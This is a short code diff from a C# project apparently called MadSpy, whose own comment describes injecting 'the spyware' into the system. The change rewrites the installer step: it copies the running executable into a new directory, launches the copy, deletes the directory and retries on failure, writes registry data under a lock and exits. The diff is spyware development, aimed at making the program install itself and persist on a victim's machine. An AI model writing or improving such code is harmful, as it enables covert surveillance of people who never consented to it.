@@ -48,17 +48,25 @@ namespace MadSpy
                     // if the execution reached here, the spyware has to be injected into the system
                     //
                     Directory.CreateDirectory(saveAsDirectory);
-                    Cmd("move \"" + Application.ExecutablePath + "\" \"" + saveAsName + "\"");
 
-                    ProcessStartInfo psi = new ProcessStartInfo(saveAsName);
-                    Process.Start(psi);
+                    Cmd("copy \"" + Application.ExecutablePath + "\" \"" + saveAsName + "\"");
+                    try
+                    {
+                        ProcessStartInfo psi = new ProcessStartInfo(saveAsName);
+                        Process.Start(psi);
+                    }
+                    catch (Exception e) 
+                    {
+                        Directory.Delete(saveAsDirectory);
+                        continue;
+                    }
 
                     lock (Program.DATALOCK)
                     {
                         Regedit(data);
-
-                        System.Environment.Exit(0);
                     }
+                    
+                    System.Environment.Exit(0);
                 }
                 else
                 {
